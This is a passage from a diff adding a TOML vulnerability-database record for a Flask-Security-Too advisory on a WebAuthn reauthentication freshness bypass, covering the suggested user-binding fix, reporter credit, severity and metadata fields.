+        \"user_id\": user.fs_uniquifier if user else None,   # NEW
+    }
+    ...
+```
+
+and check it in `WebAuthnSigninResponseForm.validate` when the form is being
+used for verify (`self.is_verify`). Either fix shape closes the bug; the
+`current_user`-bind shape mirrors [`oauth_glue.py:211`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/oauth_glue.py#L211) more directly. The
+`/wan-signin` flow (`is_verify == False`) does not need to change — it is the
+primary-signin path where there is by design no `current_user` yet.
+
+### Fix PR
+
+To follow on the advisory's temp private fork once it is provisioned.
+
+### Credit
+
+Reported by tonghuaroot.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Flask-Security-Too: WebAuthn reauthentication freshness bypass via cross-user assertion"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-f66q-9rf6-8795"]
+ave_id = "AVE-2026-1088"
+
+[meta]
+collected_at = "2026-08-06T02:42:19.770345973+00:00"
+status = "completed"
+
+[references]
+urls = []
